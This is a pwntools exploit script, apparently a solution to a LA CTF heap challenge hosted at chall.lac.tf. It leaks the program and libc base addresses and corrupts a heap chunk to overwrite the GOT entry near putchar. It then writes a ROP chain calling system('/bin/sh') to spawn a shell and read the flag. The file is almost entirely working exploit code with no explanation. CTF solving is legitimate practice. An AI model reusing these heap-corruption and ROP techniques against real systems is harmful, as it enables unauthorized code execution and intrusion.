from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
# context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chall.lac.tf", 31338)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def create_lvl(idx):
    sla("Choice: ", "1")
    sla("Enter level index: ", str(idx))

def edit_lvl(data):
    sla("Choice: ", "2")
    sla("Enter level data: ", data)

def test_lvl():
    sla("Choice: ", "3")

def explore(idx):
    sla("Choice: ", "4")
    sla("Enter level index: ", str(idx))

def reset():
    sla("Choice: ", "5")

def exit():
    sla("Choice: ", "6")

ru("A welcome gift: ")
elf.address = int(rl().strip(), 16) - elf.sym["main"]
ic(hex(elf.address))

create_lvl(0)
create_lvl(1)
explore(0)
payload = b'a'*0x20
payload += p64(0x71)
payload += p64(0)*2
payload += p64(elf.got["putchar"]-24)

edit_lvl(payload)
create_lvl(2)

explore(0)
reset()
explore(1)
explore(1)
test_lvl()
ru("Level data: ")
libc.address = uu64(6) - libc.sym["malloc"]
ic(hex(libc.address))


payload = p64(qgad(libc, "rdi"))
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.sym["system"])
pause()
edit_lvl(payload)
sl(b'cat flag.txt')
# create_lvl(3)

io.interactive()
